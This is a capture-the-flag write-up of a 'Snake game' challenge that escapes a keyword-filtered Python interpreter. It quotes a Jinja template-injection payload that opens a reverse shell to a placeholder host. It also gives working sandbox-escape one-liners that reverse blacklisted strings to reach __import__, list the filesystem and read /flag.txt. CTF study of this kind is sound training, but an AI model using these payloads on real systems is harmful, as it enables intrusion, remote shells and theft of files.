Miscellaneous: Snake game
======================================

## Task

Hi, TCC-CSIRT analyst,

snakes are wonderful creatures, and everyone loves them. Many people enjoy playing with snakes and find them fascinating companions. One on them lives on snakegame.leisure.tcc on port 23001/TCP.

## Solution

Let's open mentioned host/port with telnet:

```
# telnet snakegame.leisure.tcc 23001
Trying 10.99.24.102...
Connected to snakegame.leisure.tcc.
Escape character is '^]'.
Hello, I can only speak Python, show me your code.
```

So, we are dealing with python interpret. But pretty specific python interpret. For example, this part works:

```
Enter your code : ["a", "b"]
['a', 'b']
```

But a lot of things doesn't. When trying some stuff we find out two things: 1) a lot of things is deleted from namespace. For example globals(), locals() and similar, normally working in python interpret, returns error that name is not defined. And 2) there is probably some check on typed source code with blacklisted words. So if in code is string on blacklist it won't work. Blacklist includes "+", import, os and a lot of words which you want to type :-)

So what to do... In some challenge in one of The Catch in past years was nice Flask blogging application. It was possible to create blog posts which was rendered with Jinja templates. That time I've spent a lot of time with exploiting inputs to templates to do something... None of this was working, I didn't solve that challenge and correct solution has to do nothing with that blog application. But until now I've rembered very nice Jinja reverse shell exploit which I've found that thay. It looks like this:

```
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"x.x.x.x\",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\", \"-i\"]);'")}}{%endif%}{% endfor %}
```

So now I can try if it can work here:

```
Enter your code : ().__class__.__base__.__subclasses__()
[<class 'type'>, <class 'async_generator'>, <class 'bytearray_iterator'>, <class 'bytearray'>, <class 'bytes_iterator'>, <class 'bytes'>, <class 'builtin_function_or_method'>, <class 'callable_iterator'>, <class 'PyCapsule'>, <class 'cell'>, <class 'classmethod_descriptor'>, <class 'classmethod'>, <class 'code'>, <class 'complex'>, <class '_contextvars.Token'>, <class '_contextvars.ContextVar'>, <class '_contextvars.Context'>, <class 'coroutine'>, <class 'dict_items'>, <class 'dict_itemiterator'>, <class 'dict_keyiterator'>, <class 'dict_valueiterator'>, <class 'dict_keys'>, <class 'mappingproxy'>, <class 'dict_reverseitemiterator'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_values'>, <class 'dict'>, <class 'ellipsis'>, <class 'enumerate'>, <class 'filter'>, <class 'float'>, <class 'frame'>, <class 'frozenset'>, <class 'function'>, <class 'generator'>, <class 'getset_descriptor'>, <class 'instancemethod'>, <class 'list_iterator'>, <class 'list_reverseiterator'>, <class 'list'>, <class 'longrange_iterator'>, <class 'int'>, <class 'map'>, <class 'member_descriptor'>, <class 'memoryview'>, <class 'method_descriptor'>, <class 'method'>, <class 'moduledef'>, <class 'module'>, <class 'odict_iterator'>, <class 'pickle.PickleBuffer'>, <class 'property'>, <class 'range_iterator'>, <class 'range'>, <class 'reversed'>, <class 'symtable entry'>, <class 'iterator'>, <class 'set_iterator'>, <class 'set'>, <class 'slice'>, <class 'staticmethod'>, <class 'stderrprinter'>, <class 'super'>, <class 'traceback'>, <class 'tuple_iterator'>, <class 'tuple'>, <class 'str_iterator'>, <class 'str'>, <class 'wrapper_descriptor'>, <class 'zip'>, <class 'types.GenericAlias'>, <class 'anext_awaitable'>, <class 'async_generator_asend'>, <class 'async_generator_athrow'>, <class 'async_generator_wrapped_value'>, <class 'Token.MISSING'>, <class 'coroutine_wrapper'>, <class 'generic_alias_iterator'>, <class 'items'>, <class 'keys'>, <class 'values'>, <class 'hamt_array_node'>, <class 'hamt_bitmap_node'>, <class 'hamt_collision_node'>, <class 'hamt'>, <class 'InterpreterID'>, <class 'managedbuffer'>, <class 'memory_iterator'>, <class 'method-wrapper'>, <class 'types.SimpleNamespace'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'str_ascii_iterator'>, <class 'types.UnionType'>, <class 'weakref.CallableProxyType'>, <class 'weakref.ProxyType'>, <class 'weakref.ReferenceType'>, <class 'EncodingMap'>, <class 'fieldnameiterator'>, <class 'formatteriterator'>, <class 'BaseException'>, <class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib.BuiltinImporter'>, <class '_frozen_importlib.FrozenImporter'>, <class '_frozen_importlib._ImportLockContext'>, <class '_thread.lock'>, <class '_thread.RLock'>, <class '_thread._localdummy'>, <class '_thread._local'>, <class '_io._IOBase'>, <class '_io.IncrementalNewlineDecoder'>, <class '_io._BytesIOBuffer'>, <class 'posix.ScandirIterator'>, <class 'posix.DirEntry'>, <class '_frozen_importlib_external.WindowsRegistryFinder'>, <class '_frozen_importlib_external._LoaderBasics'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external.NamespaceLoader'>, <class '_frozen_importlib_external.PathFinder'>, <class '_frozen_importlib_external.FileFinder'>, <class 'codecs.Codec'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class '_abc._abc_data'>, <class 'abc.ABC'>, <class 'collections.abc.Hashable'>, <class 'collections.abc.Awaitable'>, <class 'collections.abc.AsyncIterable'>, <class 'collections.abc.Iterable'>, <class 'collections.abc.Sized'>, <class 'collections.abc.Container'>, <class 'collections.abc.Callable'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class '_sitebuiltins._Helper'>, <class '_distutils_hack._TrivialRe'>, <class '_distutils_hack.DistutilsMetaFinder'>, <class '_distutils_hack.shim'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'operator.attrgetter'>, <class 'operator.itemgetter'>, <class 'operator.methodcaller'>, <class 'itertools.accumulate'>, <class 'itertools.combinations'>, <class 'itertools.combinations_with_replacement'>, <class 'itertools.cycle'>, <class 'itertools.dropwhile'>, <class 'itertools.takewhile'>, <class 'itertools.islice'>, <class 'itertools.starmap'>, <class 'itertools.chain'>, <class 'itertools.compress'>, <class 'itertools.filterfalse'>, <class 'itertools.count'>, <class 'itertools.zip_longest'>, <class 'itertools.pairwise'>, <class 'itertools.permutations'>, <class 'itertools.product'>, <class 'itertools.repeat'>, <class 'itertools.groupby'>, <class 'itertools._grouper'>, <class 'itertools._tee'>, <class 'itertools._tee_dataobject'>, <class 'reprlib.Repr'>, <class 'collections.deque'>, <class '_collections._deque_iterator'>, <class '_collections._deque_reverse_iterator'>, <class '_collections._tuplegetter'>, <class 'collections._Link'>, <class 'functools.partial'>, <class 'functools._lru_cache_wrapper'>, <class 'functools.KeyWrapper'>, <class 'functools._lru_list_elem'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'enum.nonmember'>, <class 'enum.member'>, <class 'enum._auto_null'>, <class 'enum.auto'>, <class 'enum._proto_member'>, <enum 'Enum'>, <class 'enum.verify'>, <class 're.Pattern'>, <class 're.Match'>, <class '_sre.SRE_Scanner'>, <class 're._parser.State'>, <class 're._parser.SubPattern'>, <class 're._parser.Tokenizer'>, <class 're.RegexFlag'>, <class 're.Scanner'>, <class 'string.Template'>, <class 'string.Formatter'>]
```

Ok, that is definitely something. Mentioned code won't work because that modul isn't on our interpret. So in the listed modules above we have to find some different which have reference to __builtins__. Playing with hasattr function on working interpret and comparing with these subclasses it seemd that Iterable will be good candidate. So we can for example use similar approach to list files on filesystem. With one difference - builtins, import and os are on blacklist. But with this type of code we use them as string. If we type them in reverse (for example __tropmi__ intead of import) it passes the blacklist check. And we can use [::-1] for reversing string. So, this code for listing / directory works:

```
Enter your code : [i for i in ().__class__.__base__.__subclasses__() if "Iterable" == i.__name__][0].__iter__.__globals__["__snitliub__"[::-1]]["__tropmi__"[::-1]]("so"[::-1]).listdir("/")
['root', 'sbin', 'proc', 'media', 'sys', 'home', 'tmp', 'srv', 'usr', 'mnt', 'etc', 'dev', 'boot', 'lib64', 'lib', 'run', 'bin', 'var', 'opt', 'flag.txt', '.dockerenv', 'entrypoint.sh']
```

Almost there, now we just have to read file /flag.txt. So let's try this:

```
Enter your code : [i for i in ().__class__.__base__.__subclasses__() if "Iterable" == i.__name__][0].__iter__.__globals__["__snitliub__"[::-1]]["nepo"[::-1]]("/flag.txt").read()
FLAG{lY4D-GJaQ-VUks-PNQd}
```
